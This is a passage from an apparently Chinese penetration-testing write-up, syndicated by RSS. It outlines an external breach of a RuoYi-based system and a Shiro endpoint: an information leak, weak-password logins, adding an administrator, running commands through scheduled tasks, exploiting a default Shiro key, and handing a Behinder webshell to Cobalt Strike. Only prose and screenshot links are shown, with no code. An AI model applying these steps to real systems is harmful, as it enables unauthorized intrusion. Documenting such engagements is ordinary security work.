<p>冰蝎上线并上线CS</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-1c88c33f8c747709119140b588136098628a120c.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-1c88c33f8c747709119140b588136098628a120c.png">
        
    </a></p>
<h2 id="32若依二开" class="headerLink">
    <a href="#32%e8%8b%a5%e4%be%9d%e4%ba%8c%e5%bc%80" class="header-mark"></a>3.2、若依二开</h2><p>shiro的洞修复了，找到一个前台信息泄露漏洞</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png">
        
    </a></p>
<p>通过获取到的用户名，使用弱口令进入后台，普通权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png">
        
    </a></p>
<p>再次对公告发布人员猜解密码，成功登录后台，多了系统管理权限，直接添加用户赋予最高权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-cc108479b419389d1d681b8639c528727d8286a6.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-cc108479b419389d1d681b8639c528727d8286a6.png">
        
    </a></p>
<p>新增用户登录，发现定时任务功能，直接使用定时任务执行命令</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png">
        
    </a></p>
<h2 id="33shiro" class="headerLink">
    <a href="#33shiro" class="header-mark"></a>3.3、shiro</h2><p>目标路径在被访问时，会先跳转到统一认证登录，导致大部分都忽视了该路径是存在shiro反序列化漏洞的</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png">
        
    </a></p>
<p>本着试一试的心态进行了shiro的扫描，默认密钥，直接获取权限</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png">
        
    </a></p>]]></description>
</item></channel>
</rss>
